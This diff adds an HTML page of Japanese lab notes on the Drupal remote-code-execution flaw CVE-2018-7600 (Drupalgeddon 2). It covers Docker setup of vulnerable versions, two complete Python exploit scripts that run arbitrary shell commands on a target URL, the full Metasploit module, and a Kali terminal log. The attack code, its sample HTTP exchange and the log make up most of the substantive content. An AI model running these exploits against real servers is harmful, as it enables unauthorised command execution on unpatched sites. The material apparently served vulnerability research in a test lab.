@@ -1,0 +1,1094 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: "Segoe WPC", "Segoe UI", "SFUIText-Light", "HelveticaNeue-Light", sans-serif, "Droid Sans Fallback";
+	font-size: 14px;
+	padding: 0 12px;
+	line-height: 22px;
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	color: #4080D0;
+	text-decoration: none;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+h1 code,
+h2 code,
+h3 code,
+h4 code,
+h5 code,
+h6 code {
+	font-size: inherit;
+	line-height: auto;
+}
+
+a:hover {
+	color: #4080D0;
+	text-decoration: underline;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left: 5px solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 14px;
+	line-height: 19px;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+.mac code {
+	font-size: 12px;
+	line-height: 18px;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+/** Theming */
+
+.vscode-light,
+.vscode-light pre code {
+	color: rgb(30, 30, 30);
+}
+
+.vscode-dark,
+.vscode-dark pre code {
+	color: #DDD;
+}
+
+.vscode-high-contrast,
+.vscode-high-contrast pre code {
+	color: white;
+}
+
+.vscode-light code {
+	color: #A31515;
+}
+
+.vscode-dark code {
+	color: #D7BA7D;
+}
+
+.vscode-light pre:not(.hljs),
+.vscode-light code > div {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre:not(.hljs),
+.vscode-dark code > div {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre:not(.hljs),
+.vscode-high-contrast code > div {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+.vscode-light blockquote,
+.vscode-dark blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.vscode-high-contrast blockquote {
+	background: transparent;
+	border-color: #fff;
+}
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+</style>
+
+</head>
+<body>
+<h1>リファレンス</h1>
+<pre><code>    https://www.drupal.org/sa-core-2018-002
+    https://greysec.net/showthread.php?tid=2912
+    https://research.checkpoint.com/uncovering-drupalgeddon-2/
+    https://github.com/a2u/CVE-2018-7600'],
+    https://github.com/nixawk/labs/issues/19']
+</code></pre>
+<h1>検証環境構築</h1>
+<p>drupalのdockerhubのtag一覧<br>
+https://hub.docker.com/r/library/drupal/tags/</p>
+<pre class="hljs"><code><div>7-fpm
+7.58-fpm
+7
+7.58
+7-apache
+7.58-apache
+8.3-fpm
+8.3.9-fpm
+8.3
+8.3.9
+8.3-apache
+8.3.9-apache
+8.4-fpm
+8.4.6-fpm
+8.4
+8.4.6
+8.4-apache
+8.4.6-apache
+fpm-alpine
+8-fpm-alpine
+8.5-fpm-alpine
+8.5.1-fpm-alpine
+fpm
+8-fpm
+8.5-fpm
+8.5.1-fpm
+latest
+8
+8.5
+8.5.1
+apache
+8-apache
+8.5-apache
+8.5.1-apache
+7-fpm-alpine
+7.58-fpm-alpine
+8.3-fpm-alpine
+8.3.9-fpm-alpine
+8.4-fpm-alpine
+8.4.6-fpm-alpine
+7.57-fpm
+7.57
+7.57-apache
+8.5.0-fpm
+8.5.0
+8.5.0-apache
+8.5.0-fpm-alpine
+rc-fpm
+8.5-rc-fpm
+8.5.0-rc1-fpm
+rc-fpm-alpine
+8.5-rc-fpm-alpine
+8.5.0-rc1-fpm-alpine
+8.4.5-fpm
+8.4.5
+8.4.5-apache
+rc
+8.5-rc
+8.5.0-rc1
+rc-apache
+8.5-rc-apache
+8.5.0-rc1-apache
+7.57-fpm-alpine
+8.4.5-fpm-alpine
+7.56-fpm
+7.56
+7.56-apache
+8.4.4-fpm
+8.4.4
+8.4.4-apache
+8.5.0-beta1-fpm
+8.5.0-beta1
+8.5.0-beta1-apache
+8.5.0-beta1-fpm-alpine
+7.56-fpm-alpine
+8.4.4-fpm-alpine
+8.5.0-alpha1
+8.5.0-alpha1-apache
+8.5.0-alpha1-fpm-alpine
+8.5.0-alpha1-fpm
+8.3.7-fpm
+8.3.7-fpm-alpine
+8.3.7
+8.3.7-apache
+8.4.3-fpm
+8.4.3
+8.4.3-apache
+8.4.3-fpm-alpine
+8.4.2-fpm-alpine
+8.4.2-fpm
+8.4.2
+8.4.2-apache
+8.4.1-fpm
+8.4.1
+8.4.1-apache
+8.4.0-fpm
+8.4.0
+8.4.0-apache
+8.4.0-fpm-alpine
+8.4-rc-fpm
+</div></code></pre>
+<p>これらのtxtファイルを作っておく</p>
+<h4>建てる</h4>
+<p><code>for ((i=0; i&lt;10; ++i)); do docker run -it -d -p ${i}:80 drupal:$(cat tags.txt) ; done</code></p>
+<h4>全削除</h4>
+<p><code>docker ps -a | awk '{print $1}' | tail -n +2 | xargs docker rm</code></p>
+<p>for文でdocker runして一気にdruaplを建てる</p>
+<hr>
+<h1>攻撃コード</h1>
+<p>http://192.168.204.80:81/user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax<br>
+jsonから任意のコマンド実行とかができる</p>
+<h3>Exploit-1(python)</h3>
+<pre class="hljs"><code><div><span class="hljs-comment">#!/usr/bin/env</span>
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> requests
+
+<span class="hljs-keyword">print</span> (<span class="hljs-string">'################################################################'</span>)
+<span class="hljs-keyword">print</span> (<span class="hljs-string">'# Proof-Of-Concept for CVE-2018-7600'</span>)
+<span class="hljs-keyword">print</span> (<span class="hljs-string">'# by Vitalii Rudnykh'</span>)
+<span class="hljs-keyword">print</span> (<span class="hljs-string">'# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders'</span>)
+<span class="hljs-keyword">print</span> (<span class="hljs-string">'# https://github.com/a2u/CVE-2018-7600'</span>)
+<span class="hljs-keyword">print</span> (<span class="hljs-string">'################################################################'</span>)
+<span class="hljs-keyword">print</span> (<span class="hljs-string">'Provided only for educational or information purposes\n'</span>)
+
+target = input(<span class="hljs-string">'Enter target url (example: https://domain.ltd/): '</span>)
+
+url = target + <span class="hljs-string">'user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax'</span> 
+payload = {<span class="hljs-string">'form_id'</span>: <span class="hljs-string">'user_register_form'</span>, <span class="hljs-string">'_drupal_ajax'</span>: <span class="hljs-string">'1'</span>, <span class="hljs-string">'mail[#post_render][]'</span>: <span class="hljs-string">'exec'</span>, <span class="hljs-string">'mail[#type]'</span>: <span class="hljs-string">'markup'</span>, <span class="hljs-string">'mail[#markup]'</span>: <span class="hljs-string">'echo ";-)" | tee hello.txt'</span>}
+
+r = requests.post(url, data=payload)
+<span class="hljs-keyword">if</span> r.status_code != <span class="hljs-number">200</span>:
+  sys.exit(<span class="hljs-string">"Not exploitable"</span>)
+<span class="hljs-keyword">print</span> (<span class="hljs-string">'\nCheck: '</span>+target+<span class="hljs-string">'hello.txt'</span>)
+</div></code></pre>
+<h3>Exploit-1(python)</h3>
+<pre class="hljs"><code><div>
+<span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
+
+<span class="hljs-comment"># CVE-2018-7600</span>
+<span class="hljs-comment"># Drupal: Unsanitized requests allow remote attackers to execute arbitrary code</span>
+
+<span class="hljs-string">"""Tested against Drupal 8.4.5
+
+$ wget -c https://ftp.drupal.org/files/projects/drupal-8.4.5.tar.gz
+$ setup Apache2 + Mysql + Drupal
+
+$ python exploit-CVE-2018-7600.py http://192.168.1.19 "pwd"
+/var/www/html
+
+----
+
+POST /user/register?element_parents=account%2Fmail%2F%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1
+Host: 127.0.0.1
+User-Agent: python-requests/2.18.4
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+Content-Length: 144
+Content-Type: application/x-www-form-urlencoded
+
+form_id=user_register_form&amp;_drupal_ajax=1&amp;mail%5B%23type%5D=markup&amp;mail%5B%23post_render%5D%5B%5D=exec&amp;mail%5B%23markup%5D=printf admin | md5sum
+
+HTTP/1.1 200 OK
+Date: Fri, 13 Apr 2018 05:19:28 GMT
+Server: Apache/2.4.29 (Debian)
+Cache-Control: must-revalidate, no-cache, private
+X-UA-Compatible: IE=edge
+Content-language: en
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Expires: Sun, 19 Nov 1978 05:00:00 GMT
+X-Generator: Drupal 8 (https://www.drupal.org)
+X-Drupal-Ajax-Token: 1
+Content-Length: 191
+Connection: close
+Content-Type: application/json
+
+[{"command":"insert","method":"replaceWith","selector":null,"data":"21232f297a57a5a743894a0e4a801fc3  -\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
+
+"""</span>
+
+<span class="hljs-comment"># sudo pip install requests</span>
+
+
+<span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function
+
+__all__ = [<span class="hljs-string">'exploit'</span>]
+__author__ = [
+    <span class="hljs-string">'a2u'</span>,   <span class="hljs-comment"># module developer</span>
+    <span class="hljs-string">'Nixawk'</span> <span class="hljs-comment"># module Improved</span>
+]
+
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> requests
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_http_payload</span><span class="hljs-params">(drupal_home_url, php_func, php_func_param)</span>:</span>
+    <span class="hljs-string">"""Exploit CVE-2018-7600 drupal: Unsanitized requests
+    allow remote attackers to execute arbitrary code
+    """</span>
+    
+    params = {
+        <span class="hljs-string">'element_parents'</span>: <span class="hljs-string">'account/mail/#value'</span>,
+        <span class="hljs-string">'ajax_form'</span>: <span class="hljs-number">1</span>,
+        <span class="hljs-string">'_wrapper_format'</span>: <span class="hljs-string">'drupal_ajax'</span>
+    }
+
+    payload = {
+        <span class="hljs-string">'form_id'</span>: <span class="hljs-string">'user_register_form'</span>,
+        <span class="hljs-string">'_drupal_ajax'</span>: <span class="hljs-string">'1'</span>,
+        <span class="hljs-string">'mail[#type]'</span>: <span class="hljs-string">'markup'</span>,
+        <span class="hljs-string">'mail[#post_render][]'</span>: php_func,
+        <span class="hljs-string">'mail[#markup]'</span>: php_func_param
+    }
+
+    <span class="hljs-comment"># Clean URLs - Enabled</span>
+    url = requests.compat.urljoin(drupal_home_url, <span class="hljs-string">'/user/register'</span>)
+
+    <span class="hljs-keyword">return</span> requests.post(
+        url,
+        params=params,
+        data=payload
+    )
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span><span class="hljs-params">(drupal_home_url)</span>:</span>
+    <span class="hljs-string">"""Check if the target is vulnerable to CVE-2018-7600.
+    """</span>
+    status = <span class="hljs-keyword">False</span>
+
+    randflag = <span class="hljs-string">'CVE-2018-7600'</span>
+    vulnflag = randflag + <span class="hljs-string">'[{"command":"insert"'</span>
+    response = send_http_payload(drupal_home_url, <span class="hljs-string">'printf'</span>, randflag)
+    <span class="hljs-keyword">if</span> response <span class="hljs-keyword">and</span> response.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> randflag <span class="hljs-keyword">in</span> response.text:
+        print(<span class="hljs-string">"[*] %s is vulnerable"</span> % drupal_home_url)
+        status = <span class="hljs-keyword">True</span>
+    <span class="hljs-keyword">else</span>:
+        print(<span class="hljs-string">"[?] %s is unknown"</span> % drupal_home_url)
+
+    <span class="hljs-keyword">return</span> status
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span><span class="hljs-params">(drupal_home_url, php_exec_func=<span class="hljs-string">'passthru'</span>, command=<span class="hljs-string">'whoami'</span>)</span>:</span>
+    <span class="hljs-string">"""Execute os command.
+    """</span>
+    response = send_http_payload(drupal_home_url, php_exec_func, command)
+    <span class="hljs-keyword">if</span> <span class="hljs-string">'[{"command":"insert"'</span> <span class="hljs-keyword">in</span> response.text:
+        command_output, _ = response.text.split(<span class="hljs-string">'[{"command":"insert"'</span>)
+        print(command_output)
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
+    <span class="hljs-keyword">if</span> len(sys.argv) != <span class="hljs-number">3</span>:
+        print(<span class="hljs-string">"Usage: python %s &lt;drupal-home-url&gt; &lt;cmd&gt;"</span> % sys.argv[<span class="hljs-number">0</span>])
+        sys.exit(<span class="hljs-number">0</span>)
+
+    exploit(sys.argv[<span class="hljs-number">1</span>], command=sys.argv[<span class="hljs-number">2</span>])
+</div></code></pre>
+<h3>Exploit-2</h3>
+<pre class="hljs"><code><div><span class="hljs-comment">##</span>
+<span class="hljs-comment"># This module requires Metasploit: https://metasploit.com/download</span>
+<span class="hljs-comment"># Current source: https://github.com/rapid7/metasploit-framework</span>
+<span class="hljs-comment">##</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MetasploitModule</span> &lt; Msf::Exploit::<span class="hljs-title">Remote</span></span>
+
+  Rank = ExcellentRanking
+
+  <span class="hljs-keyword">include</span> Msf::Exploit::Remote::HttpClient
+
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">initialize</span><span class="hljs-params">(info = {})</span></span>
+    <span class="hljs-keyword">super</span>(update_info(info,
+      <span class="hljs-string">'Name'</span>           =&gt; <span class="hljs-string">'Drupal Drupalgeddon 2'</span>,
+      <span class="hljs-string">'Description'</span>    =&gt; <span class="hljs-string">%q{
+        This module exploits a vulnerability.
+      }</span>,
+      <span class="hljs-string">'Author'</span>         =&gt; [
+        <span class="hljs-string">'Jasper Mattsson'</span>, <span class="hljs-comment"># Vulnerability discovery</span>
+        <span class="hljs-string">'a2u'</span>,             <span class="hljs-comment"># Proof of concept</span>
+        <span class="hljs-string">'Nixawk'</span>,          <span class="hljs-comment"># Proof of concept</span>
+        <span class="hljs-string">'wvu'</span>              <span class="hljs-comment"># Metasploit module</span>
+      ],
+      <span class="hljs-string">'References'</span>     =&gt; [
+        [<span class="hljs-string">'CVE'</span>, <span class="hljs-string">'2018-7600'</span>],
+        [<span class="hljs-string">'URL'</span>, <span class="hljs-string">'https://www.drupal.org/sa-core-2018-002'</span>],
+        [<span class="hljs-string">'URL'</span>, <span class="hljs-string">'https://greysec.net/showthread.php?tid=2912'</span>],
+        [<span class="hljs-string">'URL'</span>, <span class="hljs-string">'https://research.checkpoint.com/uncovering-drupalgeddon-2/'</span>],
+        [<span class="hljs-string">'URL'</span>, <span class="hljs-string">'https://github.com/a2u/CVE-2018-7600'</span>],
+        [<span class="hljs-string">'URL'</span>, <span class="hljs-string">'https://github.com/nixawk/labs/issues/19'</span>]
+      ],
+      <span class="hljs-string">'DisclosureDate'</span> =&gt; <span class="hljs-string">'Mar 28 2018'</span>,
+      <span class="hljs-string">'License'</span>        =&gt; MSF_LICENSE,
+      <span class="hljs-string">'Platform'</span>       =&gt; <span class="hljs-string">'unix'</span>,
+      <span class="hljs-string">'Arch'</span>           =&gt; ARCH_CMD,
+      <span class="hljs-string">'Privileged'</span>     =&gt; <span class="hljs-literal">false</span>,
+      <span class="hljs-string">'Targets'</span>        =&gt; [
+        [<span class="hljs-string">'Drupal &lt; 7.58, &lt; 8.3.9, &lt; 8.4.6, &lt; 8.5.1'</span>, {}]
+      ],
+      <span class="hljs-string">'DefaultTarget'</span>  =&gt; <span class="hljs-number">0</span>,
+      <span class="hljs-string">'DefaultOptions'</span> =&gt; {
+        <span class="hljs-string">'PAYLOAD'</span>      =&gt; <span class="hljs-string">'cmd/unix/generic'</span>,
+        <span class="hljs-string">'CMD'</span>          =&gt; <span class="hljs-string">'id; uname -a'</span>
+      }
+    ))
+
+    register_options([
+      OptString.new(<span class="hljs-string">'TARGETURI'</span>, [<span class="hljs-literal">true</span>, <span class="hljs-string">'Path to Drupal install'</span>, <span class="hljs-string">'/'</span>]),
+      OptBool.new(<span class="hljs-string">'CLEAN_URLS'</span>,  [<span class="hljs-literal">false</span>, <span class="hljs-string">'If clean URLs are enabled'</span>, <span class="hljs-literal">true</span>]),
+      OptBool.new(<span class="hljs-string">'DUMP_OUTPUT'</span>, [<span class="hljs-literal">false</span>, <span class="hljs-string">'If output should be dumped'</span>, <span class="hljs-literal">true</span>])
+    ])
+  <span class="hljs-keyword">end</span>
+
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span></span>
+    token = Rex::Text.rand_text_alphanumeric(<span class="hljs-number">8</span>..<span class="hljs-number">42</span>)
+
+    res = exploit(<span class="hljs-symbol">code:</span> <span class="hljs-string">"echo <span class="hljs-subst">#{token}</span>"</span>)
+
+    <span class="hljs-keyword">if</span> res &amp;&amp; res.body.<span class="hljs-keyword">include</span>?(token)
+      <span class="hljs-keyword">return</span> CheckCode::Vulnerable
+    <span class="hljs-keyword">end</span>
+
+    CheckCode::Safe
+  <span class="hljs-keyword">end</span>
+
+  <span class="hljs-comment"># <span class="hljs-doctag">TODO:</span> passthru() may be disabled, so try others</span>
+  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span><span class="hljs-params">(<span class="hljs-symbol">func:</span> <span class="hljs-string">'passthru'</span>, <span class="hljs-symbol">code:</span> payload.encoded)</span></span>
+    <span class="hljs-keyword">if</span> datastore[<span class="hljs-string">'CLEAN_URLS'</span>]
+      register = <span class="hljs-string">'/user/register'</span>
+    <span class="hljs-keyword">else</span>
+      register = <span class="hljs-string">'?q=user/register'</span>
+    <span class="hljs-keyword">end</span>
+
+    print_status(<span class="hljs-string">"Executing on target: <span class="hljs-subst">#{code}</span>"</span>)
+
+    res = send_request_cgi(
+      <span class="hljs-string">'method'</span>    =&gt; <span class="hljs-string">'POST'</span>,
+      <span class="hljs-string">'uri'</span>       =&gt; normalize_uri(target_uri.path, register),
+      <span class="hljs-string">'vars_get'</span>  =&gt; {
+        <span class="hljs-string">'element_parents'</span> =&gt; <span class="hljs-string">'account/mail/#value'</span>,
+        <span class="hljs-string">'ajax_form'</span>       =&gt; <span class="hljs-number">1</span>,
+        <span class="hljs-string">'_wrapper_format'</span> =&gt; <span class="hljs-string">'drupal_ajax'</span>
+      },
+      <span class="hljs-string">'vars_post'</span> =&gt; {
+        <span class="hljs-string">'form_id'</span>              =&gt; <span class="hljs-string">'user_register_form'</span>,
+        <span class="hljs-string">'_drupal_ajax'</span>         =&gt; <span class="hljs-number">1</span>,
+        <span class="hljs-string">'mail[#type]'</span>          =&gt; <span class="hljs-string">'markup'</span>,
+        <span class="hljs-string">'mail[#post_render][]'</span> =&gt; func,
+        <span class="hljs-string">'mail[#markup]'</span>        =&gt; code
+      }
+    )
+
+    <span class="hljs-keyword">if</span> res.<span class="hljs-literal">nil</span>? <span class="hljs-params">||</span> res.code != <span class="hljs-number">200</span>
+      print_error(<span class="hljs-string">"Unexpected reply: <span class="hljs-subst">#{res.inspect}</span>"</span>)
+      <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
+    <span class="hljs-keyword">end</span>
+
+    print_line(res.body) <span class="hljs-keyword">if</span> datastore[<span class="hljs-string">'DUMP_OUTPUT'</span>]
+
+    res
+  <span class="hljs-keyword">end</span>
+
+<span class="hljs-keyword">end</span>
+</div></code></pre>
+<hr>
+<h1>screen shot</h1>
+<img src="https://imgur.com/download/mjD12Tz" width=80%>
+<img src="https://imgur.com/download/MvK0Ywg" width=80%>
+<h1>log</h1>
+<pre class="hljs"><code><div>2018-04-15T18:19:51.790 - 
+2018-04-15T18:19:51.794 - The programs included with the Kali GNU/Linux system are free software;
+2018-04-15T18:19:51.795 - the exact distribution terms for each program are described in the
+2018-04-15T18:19:51.795 - individual files in /usr/share/doc/*/copyright.
+2018-04-15T18:19:51.795 - 
+2018-04-15T18:19:51.796 - Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+2018-04-15T18:19:51.796 - permitted by applicable law.
+2018-04-15T18:19:51.796 - Last login: Sat Apr 14 00:41:40 2018 from 192.168.204.7
+2018-04-15T18:19:53.870 - root@kali:~# 
+2018-04-15T18:19:54.029 - root@kali:~# 
+2018-04-15T18:19:54.752 - root@kali:~# clear
+2018-04-15T18:19:54.913 - root@kali:~# 
+2018-04-15T18:19:55.055 - root@kali:~# 
+2018-04-15T18:19:55.429 - root@kali:~# ls
+2018-04-15T18:19:55.595 - 
+2018-04-15T18:19:55.886 - c99.php        CVE-2018-7600     echo-sd         kali-archive-keyring_2018.1_all.deb  nmap-7.60-1.x86_64.rpm  Release.gpg         tor-ip.log
+2018-04-15T18:19:55.886 - coffeeMiner    CVE-2018-7600.rb  gateway.docker  metasploitavevasion                  nmap-7.60.tar.bz2       Spaghetti           weevely.php
+2018-04-15T18:19:55.887 - coin-hive      dde_delivery.rb   hello.txt       Mirai-Source-Code                    password.lst.gz         test.rb
+2018-04-15T18:19:55.887 - cve-2018-7600  Desktop           iplist          nmap-7.60                            reGeorg                 tor-exit-node-list
+2018-04-15T18:19:55.889 - root@kali:~# 
+2018-04-15T18:19:57.221 - root@kali:~# 
+2018-04-15T18:20:01.850 - root@kali:~# cd /opt/metasploit-framework/
+2018-04-15T18:20:02.019 - root@kali:/opt/metasploit-framework# 
+2018-04-15T18:20:15.660 - root@kali:/opt/metasploit-framework# ls
+2018-04-15T18:20:15.871 - 
+2018-04-15T18:20:16.035 - app                 COPYING     docker                       documentation          Gemfile.lock  metasploit-framework.gemspec  msfrpc     plugins    scripts  Vagrantfile
+2018-04-15T18:20:16.035 - CODE_OF_CONDUCT.md  CURRENT.md  docker-compose.override.yml  external               lib           modules                       msfrpcd    Rakefile   spec
+2018-04-15T18:20:16.035 - config              data        docker-compose.yml           Gemfile                LICENSE       msfconsole                    msfupdate  README.md  test
+2018-04-15T18:20:16.036 - CONTRIBUTING.md     db          Dockerfile                   Gemfile.local.example  LICENSE_GEMS  msfd                          msfvenom   script     tools
+2018-04-15T18:20:16.039 - root@kali:/opt/metasploit-framework# 
+2018-04-15T18:20:29.484 - root@kali:/opt/metasploit-framework# cd modules/
+2018-04-15T18:20:29.640 - root@kali:/opt/metasploit-framework/modules# 
+2018-04-15T18:20:30.038 - root@kali:/opt/metasploit-framework/modules# ls
+2018-04-15T18:20:30.175 - auxiliary  encoders  exploits  nops  payloads  post
+2018-04-15T18:20:30.624 - root@kali:/opt/metasploit-framework/modules# 
+2018-04-15T18:20:30.791 - root@kali:/opt/metasploit-framework/modules# 
+2018-04-15T18:20:32.144 - root@kali:/opt/metasploit-framework/modules# cd exploits/
+2018-04-15T18:20:32.300 - root@kali:/opt/metasploit-framework/modules/exploits# 
+2018-04-15T18:20:32.644 - root@kali:/opt/metasploit-framework/modules/exploits# ls
+2018-04-15T18:20:32.714 - aix  android  apple_ios  bsdi  cve-2018-7600.rb  dialup  example.rb  firefox  freebsd  hpux  irix  linux  mainframe  multi  netware  osx  solaris  unix  windows
+2018-04-15T18:20:33.059 - root@kali:/opt/metasploit-framework/modules/exploits# 
+2018-04-15T18:20:33.222 - root@kali:/opt/metasploit-framework/modules/exploits# 
+2018-04-15T18:20:36.409 - root@kali:/opt/metasploit-framework/modules/exploits# cat cve-2018-7600.rb 
+2018-04-15T18:20:36.425 - ##
+2018-04-15T18:20:36.425 - # This module requires Metasploit: https://metasploit.com/download
+2018-04-15T18:20:36.425 - # Current source: https://github.com/rapid7/metasploit-framework
+2018-04-15T18:20:36.425 - ##
+2018-04-15T18:20:36.425 - 
+2018-04-15T18:20:36.425 - class MetasploitModule &lt; Msf::Exploit::Remote
+2018-04-15T18:20:36.425 - 
+2018-04-15T18:20:36.426 -   Rank = ExcellentRanking
+2018-04-15T18:20:36.426 - 
+2018-04-15T18:20:36.426 -   include Msf::Exploit::Remote::HttpClient
+2018-04-15T18:20:36.426 - 
+2018-04-15T18:20:36.426 -   def initialize(info = {})
+2018-04-15T18:20:36.426 -     super(update_info(info,
+2018-04-15T18:20:36.427 -       'Name'           =&gt; 'Drupal Drupalgeddon 2',
+2018-04-15T18:20:36.427 -       'Description'    =&gt; %q{
+2018-04-15T18:20:36.427 -         This module exploits a vulnerability.
+2018-04-15T18:20:36.428 -       },
+2018-04-15T18:20:36.428 -       'Author'         =&gt; [
+2018-04-15T18:20:36.428 -         'Jasper Mattsson', # Vulnerability discovery
+2018-04-15T18:20:36.428 -         'a2u',             # Proof of concept
